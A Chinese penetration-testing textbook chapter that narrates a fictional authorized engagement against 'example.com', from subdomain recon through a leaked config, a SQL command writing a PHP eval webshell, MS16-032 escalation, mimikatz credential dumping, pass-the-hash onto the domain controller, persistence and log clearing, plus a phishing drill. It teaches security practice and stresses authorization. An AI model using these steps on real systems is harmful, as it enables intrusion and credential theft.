## 16.1 项目背景

### 16.1.1 客户情况

客户是一家中等规模的科技公司，
叫"某某科技有限公司"。
公司大概两三百人，
有自己的官网、业务系统，
内部是域环境。

这次客户想做一次**全面的渗透测试**，
包括：
- 外网渗透测试（从互联网发起，黑盒）
- 内网渗透测试（模拟已经进入内网的情况）
- 社会工程学测试（钓鱼演练）

目标是：
尽可能发现安全问题，
检验公司的整体安全防护能力。

测试周期：两周。

好，
项目开始。

## 16.2 第一阶段：外网信息收集

**第一步：信息收集。**

先从外网开始，
什么都不知道，
黑盒测试。
先搞清楚目标有什么。

### 16.2.1 域名 & 子域名收集

先从域名开始。
客户公司官网是 `example.com`。

先收集一下子域名：

```
用的工具：
  • subfinder / amass / 子域名挖掘机
  • 百度、谷歌搜索（site:example.com）
  • 证书透明度查询（crt.sh）
  • DNS域传送漏洞检测
  • Wayback Machine 看历史记录
```

一顿操作下来，
找到了不少子域名：

```
  www.example.com          官网
  mail.example.com         邮件系统
  vpn.example.com          远程接入VPN
  oa.example.com           办公系统OA
  test.example.com         测试环境
  dev.example.com          开发环境
  git.example.com          代码仓库
  forum.example.com        内部论坛
  ......还有一些
```

不错，
十来个子域名，
攻击面不小。

### 16.2.2 端口 & 服务探测

接下来，
对这些域名对应的IP，
做端口扫描和服务识别。

用Nmap扫：
```bash
nmap -sV -sC -O -p- 目标IP
```

扫出来的结果大致是这样的：
```
  www.example.com
    • 80/tcp  open  http    Nginx
    • 443/tcp open  https   Nginx
    • 22/tcp  open  ssh     OpenSSH

  mail.example.com
    • 25/tcp  open  smtp
    • 110/tcp open  pop3
    • 143/tcp open  imap
    • 80/tcp  open  http    邮件Web端

  vpn.example.com
    • 443/tcp open  https   SSL VPN

  test.example.com
    • 80/tcp  open  http    Apache
    • 3306/tcp open mysql   MySQL（居然外网开着！）
    • 21/tcp  open  ftp     vsftpd

  git.example.com
    • 80/tcp  open  http    GitLab
    • 22/tcp  open  ssh
```

收获不小！
尤其是 `test.example.com`，
居然把MySQL和FTP都开在公网上了，
而且看起来是个测试环境，
防护肯定比较弱。
重点关注。

### 16.2.3 目录扫描 & 指纹识别

对几个Web站点，
做一下目录扫描和指纹识别。

```
工具：
  • whatweb / 御剑 / 指纹识别工具
  • dirsearch / gobuster / dirb —— 目录扫描
```

扫出来一些东西：
```
  www.example.com
    • 用的是某知名CMS
    • 有后台 /admin/
    • 有上传目录 /upload/

  test.example.com
    • 目录扫出一堆东西
    • 有phpMyAdmin！
    • 有个测试页面 info.php，phpinfo全暴露
    • 还有个备份文件 www.zip

  git.example.com
    • GitLab，版本还挺老的
    • 有注册功能，不知道开没开

  oa.example.com
    • 某OA系统
    • 有默认口令？试试
```

信息收集阶段收获满满。
接下来开始漏洞扫描和漏洞利用。

---

## 16.3 第二阶段：外网漏洞利用

信息收集完了，
找到了一堆目标。
接下来一个一个试。

### 16.3.1 第一个突破口：测试环境备份文件

先从看起来最弱的 `test.example.com` 下手。

刚才目录扫描扫到了一个 `www.zip`，
看着像是网站源码备份。
直接访问下载下来看看。

下载下来解压一瞅，
好家伙，
真是整个网站的源码备份！
里面还有 `config.php`，
数据库的账号密码明明白白写在里面。

```php
// config.php
$dbhost = 'localhost';
$dbuser = 'testuser';
$dbpass = 'Test@123456';
$dbname = 'testdb';
```

而且之前Nmap扫到这台机器的MySQL（3306端口）是对外开着的！
那还等什么，
直接用这个账号密码登MySQL试试。

用MySQL客户端一连，
成了！
直接连上了数据库。
而且这个用户权限还不低，
能读写文件，甚至能提权。

第一步，
拿到了MySQL的权限，
还是从公网直接连的。
稳了。

### 16.3.2 从数据库到WebShell

有了数据库权限，
下一步就是想办法拿到WebShell。

怎么拿？
MySQL有个 `INTO OUTFILE` 功能，
可以把内容写到文件里。
如果知道网站的根目录路径，
就能往里面写一句话木马。

网站根目录路径怎么找？
刚才不是有 `info.php` 吗，
phpinfo里一看就知道了，
网站根目录是 `C:\www\test\`。

好，
写马！

```sql
SELECT '<?php eval($_POST["a"]);?>' INTO OUTFILE 'C:/www/test/shell.php';
```

执行成功！
然后访问 `http://test.example.com/shell.php`，
用菜刀/蚁剑连接，
连上了！
WebShell到手。

又进一步，
从数据库权限拿到了WebShell。

### 16.3.3 从WebShell到系统权限

现在有了WebShell，
接下来看看权限怎么样，
能不能提权。

先看看当前用户：
`whoami` —— `nt authority\iusr`
IIS的匿名用户，权限不高。

再看看系统信息：
`systeminfo` —— Windows Server 2008 R2，
补丁没打几个，
老系统。

老系统？
那可利用的漏洞就多了。
试试几个经典的提权漏洞。
上传个提权木马，
或者用Metasploit生成个Payload传上去执行。

这里我们用 **MS16-032** 试试，
这个系统看起来就没打这个补丁。

生成个Payload，
传上去执行，
跑一下提权exp，
成功！
权限变成 `nt authority\system` 了。

系统权限到手。

从一个备份文件，
到数据库，到WebShell，
再到系统权限。
不到半天，
第一台服务器拿下。

### 16.3.4 第一台机器的信息收集

拿下第一台机器，
先别急着打内网，
先在这台机器上收集信息。

```
做什么呢？
  • 抓密码哈希（hashdump）
  • 用mimikatz抓明文密码
  • 看这台机器是不是在域里
  • 看网卡信息、内网网段
  • 看浏览器保存的密码
  • 看各种配置文件
  • ......
```

收获：
- 这台机器不在域里，是独立的服务器
- 抓到了几个本地用户的哈希和密码
- 有两块网卡，其中一块在内网，网段是 192.168.1.0/24
- 从浏览器密码里找到几个内部系统的账号密码
- 从配置文件里又找到几套数据库密码

不错，
有内网网段了，
而且有了一些凭据。
接下来可以进内网看看了。

### 16.3.5 其他外网打点尝试

除了这个test环境，
其他几个外网站点也在试。

```
  • 官网CMS：有几个低危漏洞，没找到能直接打进去的
  • 邮件系统：弱口令爆破了一下，没成功
  • GitLab：版本老，有几个漏洞，正在试
  • OA系统：也在测试中
```

不过既然已经有一台服务器进去了，
而且还能进内网，
那主战场就可以转到内网了。
外网的这些作为补充，
慢慢试。

## 16.4 第三阶段：内网信息收集与横向移动

现在有了一台内网的跳板机（test服务器），
接下来开始内网渗透。

### 16.4.1 内网探测

先从跳板机出发，
探探内网的情况。

首先，
做个Socks代理，
把我们的Kali"放进"内网，
方便用各种工具。
用Meterpreter的autoroute + socks模块，
或者EarthWorm，
搭个Socks5代理。
有了代理，
Nmap、SQLMap、Hydra这些工具都能用了。

然后开始扫内网：
```
  • 先扫 192.168.1.0/24 这个网段
  • 看看哪些主机存活
  • 看看开了哪些端口
  • 看看有哪些服务
```

扫出来的结果：
```
  192.168.1.1      网关
  192.168.1.2      域控！（开了53、88、389、445...一看就是DC）
  192.168.1.10     文件服务器
  192.168.1.20     Web服务器（内网的）
  192.168.1.30     数据库服务器（MySQL、MSSQL都有）
  192.168.1.50~100  一堆办公机（开了445、3389）
  ......还有一些其他服务器
```

好家伙，
内网机器不少，
而且确实有域环境！
域控就在 192.168.1.2。
目标明确了——
最终目标就是域控。

先记下来：
- 域名：EXAMPLE.COM
- 域控：192.168.1.2（DC01）
- 网段：192.168.1.0/24
- 还有没有其他网段？后面再查

### 16.4.2 凭据复用 —— 第一轮横向

现在手上有什么凭据？
- 从跳板机上抓的几个本地账号密码
- 配置文件里找到的几套数据库密码
- 浏览器里找到的几个内部系统账号

先拿这些凭据去试试，
看看别的机器能不能用。
（密码复用是内网最常见的情况。）

先扫一波445端口，
然后用手上的密码试试SMB登录。
用CrackMapExec或者Metasploit的psexec模块扫。

扫完还真有收获：
```
  • 192.168.1.30（数据库服务器）
    有个本地管理员账号，密码跟我们手上的一个密码对上了！
    密码复用。

  • 还有两三台办公机，也能用这个密码登进去
    都是本地管理员权限。
```

不错，
又拿下了几台机器，
包括数据库服务器。
数据库服务器可是好东西，
里面数据多，
而且管理员经常登录，
说不定能抓到高权限的凭据。

### 16.4.3 数据库服务器上的收获

登上数据库服务器（192.168.1.30），
先做信息收集，
再抓密码。

这台是Windows Server，
本地管理员权限。
直接上mimikatz，
抓内存里的密码。

一抓，
还真抓到了——
有个域用户 `EXAMPLE\dbadmin`，
在这台机器上登录过，
密码明文抓到了！

数据库管理员的域账号，
密码到手。
这个账号权限怎么样？
先记下来，
后面试试。

除了这个，
数据库里还有不少数据，
业务数据、用户数据...
（不过渗透测试一般不看具体数据，
证明能拿到就行。）

### 16.4.4 进一步横向 —— 用域账号打

现在有了一个域账号 `dbadmin`，
虽然只是个数据库管理员，
不是域管理员，
但好歹是域用户了，
能做的事情就多了。

先用这个账号：
```
  • 看看域里有多少用户、多少机器
  • 看看域管理员组有哪些人
  • 收集域信息
  • 用BloodHound画一下关系图，找攻击路径
```

收集完域信息，
大概搞清楚了：
- 域用户大概100多个
- 域管理员有5个人
- 有各种组：财务部、技术部、运维部...
- 关键服务器有七八台

接下来，
用 `dbadmin` 这个域账号，
扫一遍内网，
看看能登哪些机器。
（域用户可以登很多机器，
只要权限够。）

扫下来，
`dbadmin` 能登的机器还不少，
有个七八台，
大多是数据库相关的服务器。
权限有的是本地管理员，
有的是普通用户。

一台一台登上去，
每台都做信息收集、抓密码。
凭据越攒越多。

这就是内网渗透的滚雪球效应——
一台带两台，两台带四台，
越滚越大。

## 16.5 第四阶段：向域控进发

现在手上有不少机器了，
也有不少域账号了。
但还没有域管理员权限。
目标是域控，
得想办法拿到域管理员的凭据。

怎么拿？
常见的思路：
1. 找域管理员登录过的机器，上去抓密码
2. Kerberoast攻击
3. 找域控本身的漏洞
4. 等等

我们一个个试。

### 16.5.1 找域管理员在哪里登录过

先试试第一个思路——
找域管理员登录过的机器。
如果能找到一台域管理员登录过的机器，
而我们又有权限进去，
那就有可能抓到域管理员的凭据。

怎么找？
可以用BloodHound，
也可以用各种脚本扫。

扫下来发现：
```
  有一台文件服务器（192.168.1.10）
  有个域管理员最近登录过。
```

但是这台机器我们现在还进不去，
dbadmin账号没权限登这台。
怎么办？

再看看有没有别的路径。
BloodHound上一看，
有个有意思的发现：
```
  我们控制的一个用户，
  刚好在某个组里，
  而这个组对文件服务器有"可以读取本地管理员密码"的权限。
  （LAPS配置不当）
```

这就是个突破口啊！

利用这个权限，
我们读取了文件服务器的本地管理员密码。
然后用这个密码登录了文件服务器。

成功登进文件服务器！

### 16.5.2 抓到域管理员凭据

登上文件服务器，
第一件事——
抓密码！

这台机器有域管理员登录过，
内存里应该留有凭据。
上mimikatz。

一抓，
我的天，
真的有！
域管理员的NTLM哈希，
明明白白躺在内存里。

域管理员的哈希到手了！

这意味着什么？
意味着我们可以用 **Pass-the-Hash**，
以域管理员的身份，
访问域内任何一台机器（只要有权限）。
当然也包括域控。

离最终目标只剩一步了。

### 16.5.3 登陆域控

有了域管理员的哈希，
域控还不是手到擒来？

用 PsExec 或者 WMI 或者 WinRM，
加上域管理员的哈希，
直接打域控（192.168.1.2）。

```
  exploit/windows/smb/psexec
  设置用户名：EXAMPLE\Administrator
  设置哈希：（抓到的NTLM哈希）
  设置目标：192.168.1.2
  run
```

嘀——
Meterpreter会话弹回来了。
域控，拿下！

看一眼权限：
`nt authority\system`
完美。

从外网的一个测试环境备份文件，
到数据库，到WebShell，到系统权限，
再到内网横向移动，
再到抓到域管理员凭据，
最后拿下域控。
整个内网，
全部沦陷。

## 16.6 第五阶段：权限维持 & 痕迹清理

（当然，
授权测试的话，
这一步一般不做，
或者做完了马上清理。
这里只是演示流程。）

拿下域控之后，
理论上你想干嘛干嘛了。
- 想拿数据拿数据
- 想加后门加后门
- 想破坏就破坏

但渗透测试不是搞破坏，
拿到域控，
证明了我们能打到这里，
就够了。

如果要做权限维持的话，
可以做几个：
```
  • 域内留个后门账号
  • 黄金票据 / 白银票据
  • 几台关键服务器留持久化后门
  • 等等
```

当然，
测试完了，
这些后门都要清掉，
恢复原样。
不能给客户留隐患。

然后是痕迹清理：
```
  • 上过的机器，清一下日志
  • 上传的工具都删掉
  • 创建的账号、服务、计划任务都删掉
  • 改的配置都改回去
  • ......
```

尽量恢复到测试前的状态。
测试是为了发现问题，
不是为了搞破坏。

## 16.7 第六阶段：社工钓鱼演练

除了技术渗透，
这次项目还有社工钓鱼演练。

### 16.7.1 信息收集 —— 收集员工邮箱

先做信息收集，
收集公司员工的姓名、邮箱、职位。

从哪里收集？
- 公司官网的团队介绍
- 领英、脉脉等社交平台
- 招聘网站
- 等等

收集到了大概80多个员工的邮箱和姓名。
也搞清楚了公司的组织架构、
部门设置、
IT部门是谁、
领导是谁。

### 16.7.2 制作钓鱼邮件

做一封钓鱼邮件。
伪装成公司IT部门发的，
内容大概是：
"公司邮箱系统将于本周末进行升级维护，
请您在24小时内点击以下链接完成账号验证，
逾期未验证的账号将被暂停使用。"

邮件做得跟真的一样，
公司logo、签名、格式，
都跟官方邮件一模一样。
链接指向我们搭的钓鱼网站，
网站也克隆得跟公司邮箱登录页一模一样，
根本看不出区别。

### 16.7.3 发送 & 结果

把钓鱼邮件群发给收集到的80多个员工邮箱。

然后等结果。

24小时后统计：
- 点击链接的：23人（28.75%）
- 输入账号密码的：15人（18.75%）
- 其中包括2个部门经理，1个运维

结果有点惊人，
将近五分之一的员工中招了。
如果是真实的攻击，
这15个账号就全没了，
从这里面找个运维或者管理员的账号，
直接就能进内网。

员工的安全意识，
确实有待提高。

（当然，
测试完了要给员工做安全培训，
告诉他们这是演练，
教他们怎么识别钓鱼邮件。
钓鱼演练的目的不是为了抓谁，

## 16.8 第七阶段：报告撰写

测试都做完了，
最后一步——
写报告。

把所有发现的漏洞、
所有的渗透路径、
所有的风险，
都整理成一份专业的渗透测试报告。

报告里包含什么？
```
  • 执行摘要：给领导看的
    总体风险等级、最主要的问题、整体建议

  • 测试概述：
    测试范围、时间、方法、依据

  • 漏洞概览：
    一共发现多少漏洞，
    高危多少、中危多少、低危多少
    用图表展示

  • 漏洞详情：（核心）
    每个漏洞详细写：
      - 漏洞名称、严重程度
      - 漏洞描述、影响
      - 复现步骤（带截图）
      - 修复建议

  • 内网渗透路径说明：
    我们是怎么一步步打到域控的
    让客户知道风险有多大

  • 社工钓鱼结果：
    钓鱼的结果统计
    员工安全意识评估

  • 整体安全建议：
    从技术、管理、人员三个层面
    给出整体的安全建设建议

  • 附录：
    术语表、工具清单、参考资料...
```

报告写好了，
给客户做汇报，
讲清楚风险在哪里、
该怎么整改。
项目就圆满结束了。

## 16.9 案例总结 & 给你的建议

不知道你有没有一个整体的感觉。

### 16.9.1 渗透测试的一般流程

我们来回顾一下整个流程：

```
  1. 信息收集
     域名、子域名、IP、端口、服务、人员信息...
     收集得越全越好

  2. 漏洞扫描 / 漏洞探测
     扫端口、扫服务、扫漏洞
     找可能的攻击面

  3. 漏洞利用 / 打点
     从外网找一个突破口，打进去
     拿第一台机器的权限

  4. 后渗透 & 信息收集
     在打下的机器上收集信息
     抓密码、收集凭据、摸内网情况

  5. 横向移动
     从一台打到多台
     凭据越来越多，控制范围越来越大

  6. 权限提升
     从普通用户到管理员
     从本地管理员到域管理员

  7. 达成目标
     打到域控 / 拿到核心数据 / 达成测试目标

  8. 痕迹清理 & 恢复
     清理留下的痕迹，恢复系统原状

  9. 报告撰写
     整理发现，输出报告，给出修复建议
```

这就是一次完整的渗透测试的大致流程。
当然，
真实的项目可能比这个复杂得多，
也可能简单得多。
但大的思路是一样的。

### 16.9.2 给你的学习建议

最后，
给正在学习的你几个建议：

**1. 打牢基础，别光追求"打进去"**
很多新手只想学怎么打漏洞、怎么拿shell，
觉得那个酷。
但基础不牢，地动山摇。
- 网络基础懂吗？TCP/IP、HTTP、DNS...
- 系统基础懂吗？Windows、Linux常用命令、权限机制...
- 编程基础懂吗？Python、Shell、起码能看懂代码...
- Web基础懂吗？HTML、JavaScript、PHP/Java...

这些基础打牢了，
学什么都快。
不然就是知其然不知其所以然，
换个环境就不会了。

**2. 多动手，别光看不练**
看一百遍书，
不如自己动手做一遍。
- 搭靶机练
- 打CTF练
- 做实验

动手做了，
你才能真正理解。
不然都是纸上谈兵。

**3. 拓宽知识面，别局限于某一块**
渗透测试涉及的东西很广，
- Web、系统、网络、数据库
- 内网、社工、无线、逆向
- ......

别只盯着某一块，
多了解了解其他领域。
知识面越广，
思路就越开阔。

**4. 保持学习，安全这个行业日新月异**
安全行业变化太快了，
新漏洞、新技术、新攻防手段，
层出不穷。
一定要保持学习的习惯，
不断更新自己的知识。
不学习就会被淘汰。

**5. 守好底线，做正确的事**
最后也是最重要的——
**遵纪守法，守住底线。**
- 没有授权，绝对不碰别人的系统
- 不用学到的技术干坏事
- 用技术做有意义的事

技术本身没有对错，
错的是使用技术的人。
希望你能用学到的技术，
做正确的事，
让这个世界更安全。
